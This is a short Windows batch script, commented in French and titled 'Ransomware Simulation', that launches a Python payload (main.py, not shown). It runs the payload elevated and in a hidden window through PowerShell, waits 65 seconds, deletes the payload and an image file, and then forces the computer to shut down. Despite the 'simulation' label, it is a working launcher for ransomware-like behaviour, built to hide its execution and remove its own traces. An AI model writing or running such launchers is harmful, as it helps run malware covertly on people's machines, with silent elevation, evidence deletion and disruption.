@echo off
title Ransomware Simulation

REM Ajouter une commande temporaire 'ransom' dans CMD
doskey ransom=run.bat

REM Lancer en administrateur silencieux avec PowerShell
echo Lancement de la simulation en mode administrateur...
powershell -Command "Start-Process cmd -ArgumentList '/c python main.py' -Verb RunAs -WindowStyle Hidden"

REM Attendre la fin (timeout de 1 minute + 5 sec)
timeout /t 65 /nobreak >nul

REM Nettoyage et arrêt
echo Nettoyage en cours...
del main.py
del temp_image.jpg 2>nul
echo Arrêt du PC dans 5 secondes...
shutdown /s /t 5
